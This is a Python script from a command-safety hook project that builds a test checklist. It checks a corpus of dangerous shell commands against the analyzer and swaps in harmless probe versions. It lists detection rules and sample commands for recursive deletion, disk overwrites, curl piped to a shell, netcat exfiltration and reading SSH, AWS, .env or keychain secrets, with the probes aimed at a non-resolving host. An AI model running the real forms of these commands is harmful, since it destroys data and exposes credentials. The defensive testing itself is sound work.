#!/usr/bin/env python3
"""Generate the human test checklist from the real rules + corpus, verifying
every stated expectation against the analyzer so the doc cannot drift."""
import sys, yaml, json, pathlib
REPO = pathlib.Path("/Users/roctang/Code/oss/permission-lens")
sys.path.insert(0, str(REPO / "hooks"))
import permission_lens as pl

LANG = "zh"
loc = pl.load_locale(LANG)
corpus = yaml.safe_load((REPO / "tests/corpus/dangerous.yaml").read_text(encoding="utf-8"))["commands"]
benign = yaml.safe_load((REPO / "tests/corpus/benign.yaml").read_text(encoding="utf-8"))["commands"]

# What actually happens if the command is allowed to run. Only rows marked
# "safe" are ones a reader may click Allow on without consequence.
EXEC = {
    "rm-rf-risky-target": ("destructive", "删文件，且目标由变量展开"),
    "rm-rf-plain": ("destructive", "删除整个目录"),
    "dd-to-device": ("destructive", "覆写磁盘"),
    "mkfs": ("destructive", "格式化设备"),
    "shred": ("destructive", "抹除文件"),
    "chmod-chown-recursive": ("destructive", "批量改权限"),
    "chmod-world-writable": ("destructive", "放开权限"),
    "pipe-to-shell": ("destructive", "执行远程代码"),
    "shell-from-process-sub": ("destructive", "执行远程代码"),
    "curl-pipe-interpreter": ("destructive", "执行远程代码"),
    "curl-upload-file": ("exfil", "上传本地文件"),
    "file-piped-to-network": ("exfil", "外发文件内容"),
    "netcat-outbound": ("exfil", "外发文件内容"),
    "ssh-key-access": ("read", "读取 SSH 密钥"),
    "aws-creds-access": ("read", "读取 AWS 凭据"),
    "dotenv-access": ("read", "读取 .env"),
    "macos-keychain-dump": ("read", "会弹系统密码框；取消即可"),
    "macos-keychain-lookup": ("safe", "查不存在的条目 → 直接报错"),
    "linux-keyring-access": ("read", "读取 keyring（macOS 上命令不存在）"),
    "shell-history-access": ("read", "读取命令历史"),
    "base64-decode-exec": ("destructive", "执行解码出的代码"),
    "hex-decode-exec": ("destructive", "执行解码出的代码"),
    "eval-dynamic": ("destructive", "执行拼接出的命令"),
    "sudo": ("privileged", "以 root 运行"),
    "su-switch-user": ("privileged", "切换用户"),
    "git-push-force": ("destructive", "覆盖远程历史"),
    "git-reset-hard": ("destructive", "丢弃未提交改动"),
    "git-clean-force": ("destructive", "删除未跟踪文件"),
    "git-remote-change": ("config", "改推送目标"),
    "npm-publish": ("irreversible", "公开发布"),
    "pypi-upload": ("irreversible", "公开发布"),
    "iac-destroy": ("destructive", "拆除线上基础设施"),
    "cloud-cli-delete": ("destructive", "删除云资源"),
    "crontab-modify": ("config", "改定时任务"),
    "systemd-service": ("config", "改服务（macOS 上命令不存在）"),
    "launchd-modify": ("config", "改自启动项"),
    "shell-rc-append": ("config", "改 shell 启动文件"),
}
MARK = {"safe": "✅ 可放心 Allow", "read": "⚠️ 会读取隐私数据", "exfil": "⛔ 会外发数据",
        "destructive": "⛔ 有破坏性", "privileged": "⚠️ 提权", "config": "⚠️ 改配置",
        "irreversible": "⛔ 不可撤销"}

# "I'll click Deny" is NOT a safety boundary: the permission mode can change,
# and an auto-approving session runs the command anyway. So a checklist case
# must be harmless EVEN IF ALLOWED. Each probe below is verified to keep the
# same rule at the same severity before it is emitted.
# (Raised by the reviewing model 2026-07-25, correctly, against a suggested
# `security dump-keychain -d …` — the -d is exactly what prints the secrets.)
SAFE_PROBE = {
    "rm-rf-risky-target": ("rm -rf /tmp/pl-check/$PL_UNSET/*", "只删 scratch 目录"),
    "dd-to-device": ("dd if=/dev/zero of=/dev/null bs=1M count=1", "写到 /dev/null"),
    "mkfs": ("mkfs.ext4 /dev/pl-check-no-such-device", "设备不存在，报错退出"),
    "pipe-to-shell": ("curl -fsSL https://pl-check.invalid/i.sh | bash",
                      ".invalid 永不解析，shell 收到空输入"),
    "curl-pipe-interpreter": ("curl -fsSL https://pl-check.invalid/i.py | python3",
                              ".invalid 永不解析"),
    "shell-from-process-sub": ("bash <(curl -s https://pl-check.invalid/x.sh)",
                               ".invalid 永不解析"),
    "curl-upload-file": ("curl -T /dev/null https://pl-check.invalid/up",
                         "上传空内容到不存在的主机"),
    "file-piped-to-network": ("cat /dev/null | nc pl-check.invalid 443",
                              "发送空内容到不存在的主机"),
    "macos-keychain-dump": ("security dump-keychain login.keychain",
                            "无 -d，只列属性、不含密码"),
    "base64-decode-exec": ("echo '' | base64 -d | sh", "解码空串"),
    "hex-decode-exec": ("echo '' | xxd -r -p | bash", "解码空串"),
    "iac-destroy": ("cd /tmp/pl-check && terraform destroy -auto-approve",
                    "空目录里没有 state"),
}

rows_high, rows_mid, seen_cmds = [], [], set()
for entry in corpus:
    rid = entry["rule"]
    cmd, safe_note = SAFE_PROBE.get(rid, (entry["command"], None))
    hits = pl.analyze(pl.Parsed(cmd)) if not rid.startswith(("web-", "path-", "content-")) else []
    if not hits:
        continue
    ids = [m["id"] for m in hits]
    assert rid in ids, f"corpus drift: {cmd!r} no longer matches {rid} (got {ids})"
    sev = hits[0]["severity"]
    detail = pl.extract_detail(hits[0], None, cmd)
    kind, note = EXEC.get(rid, ("?", "?"))
    if safe_note:
        kind, note = "safe", safe_note
    # Escape pipes: an unescaped `|` inside a table cell breaks the columns.
    # Several corpus entries can share a rule, and they all collapse onto the
    # same safe probe — emit each probe once.
    if cmd in seen_cmds:
        continue
    seen_cmds.add(cmd)
    row = (cmd.replace("|", "\\|"), rid, pl.rule_text(loc, rid, "explanation"),
           detail, MARK.get(kind, "?"), note)
    (rows_high if sev == "high" else rows_mid).append(row)

# The corpus is for automated tests where nothing executes. A HUMAN running
# section 3 in auto mode gets no dialog by design — so these actually run.
# Swap the ones with side effects for read-only or /tmp-scoped equivalents;
# each replacement is re-verified below to still match nothing.
SAFE_VARIANT = {
    "mkdir -p build/output": "mkdir -p /tmp/pl-check/output",
    "tar -czf backup.tar.gz ./data": "tar -tzf /tmp/pl-check/nope.tar.gz",
    "git push origin feature-branch": "git push --dry-run origin HEAD",
    "sed -i.bak 's/foo/bar/g' file.txt": "sed -i.bak 's/foo/bar/g' /tmp/pl-check/f.txt",
    "chmod +x scripts/deploy.sh": "chmod +x /tmp/pl-check/deploy.sh",
    "cp src/config.example config.local": "cp src/config.example /tmp/pl-check/config.local",
}
silent = []
for e in benign:
    if not e.get("clean"):
        continue
    cmd = SAFE_VARIANT.get(e["command"], e["command"])
    hits = pl.analyze(pl.Parsed(cmd))
    assert not hits, f"safe variant regressed: {cmd!r} -> {[m['id'] for m in hits]}"
    silent.append(cmd.replace("|", "\\|"))
print(f"（安全替换 {sum(1 for e in benign if e.get('clean') and e['command'] in SAFE_VARIANT)} 条）\n高危(默认弹框): {len(rows_high)}  中低危(默认静默): {len(rows_mid)}  应静默: {len(silent)}")
json.dump({"high": rows_high, "mid": rows_mid, "silent": silent},
          open("/tmp/pl-cases.json", "w"), ensure_ascii=False, indent=1)
